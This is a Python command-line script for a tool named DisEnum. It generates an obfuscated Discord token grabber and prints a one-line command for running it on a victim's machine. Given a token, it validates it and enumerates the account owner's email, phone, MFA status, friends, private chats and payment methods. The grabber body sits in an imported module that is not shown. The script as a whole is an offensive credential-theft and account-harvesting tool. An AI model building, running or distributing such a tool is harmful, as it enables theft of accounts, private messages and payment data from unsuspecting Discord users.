#!/bin/env python3

import argparse
import sys
from colorama import init,Fore,Style,Back
from lib.tokencheck import *
from lib.enum import *
from lib.generation import *
init()

# Banner
banner = f'''{Style.BRIGHT}{Fore.RED}
 /-----------------\ {Fore.YELLOW}v1.0
       {Fore.YELLOW}DisEnum{Fore.RED}
 \-----------------/
{Style.RESET_ALL}'''

print(banner)

# Argparse
parser = argparse.ArgumentParser(description='Discord Token Enumeration')
parser.add_argument('--generate',help='Generate Obfuscated Python code that will quickly grab Discord Tokens saved locally.',action='store_true')
parser.add_argument('--token',help='A Discord Token to Enumerate.')
args = parser.parse_args()

def message(message):
	print(f'{Style.BRIGHT}{Fore.RED}[{Fore.YELLOW}DisEnum{Fore.RED}]{Style.RESET_ALL} {message}')

if not args.token and not args.generate:
	message('Error: Please supply a Token with --token to Enumerate or use --generate to generate a Token Grabber!')
	sys.exit()

elif args.generate:
# Token Grabber Generation
	message('Generating a compact Token Grabber...')
	print('\n--- Generated Python Code')
	code = generate_token_grabber()
	print(code)
	print('\n--- CMD / Powershell Command')
	print(f'python3 -c "{code}"')
	sys.exit()

# Token Enumeration

TOKEN = args.token

######################################

# Token Check
result = check(TOKEN)
if result != False:
	message(f'{Fore.GREEN}Token Is Valid!{Fore.RESET}')
else:
	message(f'{Fore.RED}Token Is Not Valid!{Fore.RESET}')
	print('Exiting...')
	sys.exit()

# Enumeration
message('Enumerated Information From Authentication:\n')

print(f'{Fore.YELLOW}Username           {Fore.RED}:{Fore.RESET} {result["username"]}')
print(f'{Fore.YELLOW}Profile Picture    {Fore.RED}:{Fore.RESET} https://cdn.discordapp.com/avatars/{result["id"]}/{result["avatar"]}.webp')
print(f'{Fore.YELLOW}User ID            {Fore.RED}:{Fore.RESET} {result["id"]}')
print(f'{Fore.YELLOW}Locale             {Fore.RED}:{Fore.RESET} {result["locale"]}')
print('')
print(f'{Fore.YELLOW}Email              {Fore.RED}:{Fore.RESET} {result["email"]}')
print(f'{Fore.YELLOW}Phone              {Fore.RED}:{Fore.RESET} {str(result["phone"])}')
print('')
print(f'{Fore.YELLOW}Email Verified     {Fore.RED}:{Fore.RESET} {str(result["verified"])}')
print(f'{Fore.YELLOW}MFA Enabled        {Fore.RED}:{Fore.RESET} {str(result["mfa_enabled"])}')
print(f'{Fore.YELLOW}NSFW Allowed (18+) {Fore.RED}:{Fore.RESET} {str(result["nsfw_allowed"])}')

# Extracting Information
print('')

message("Enumerating Friends List...")
friendcount = getfriends(TOKEN)
print(f"Friends List Successfully Enumerated! (results/friends/...)")
print(f"Friend Count: {str(friendcount)}\n")

message("Enumerating Chats... (This may take a while, be patient! It is working!)")
chatcount = getchats(TOKEN)
print(f"Chats Successfully Enumerated! (results/chats/...)")
print(f"Chat Count: {str(chatcount)}\n")

message("Enumerating Payment Methods...")
methodcount = getpaymentmethods(TOKEN)
print(f"Payment Methods Successfully Enumerated! (results/payment-methods/...)")
print(f"Payment Method Count: {str(methodcount)}\n")

# Finished
print(f"\n{Style.BRIGHT}-=+ Finished! +=-{Style.RESET_ALL}")
sys.exit()
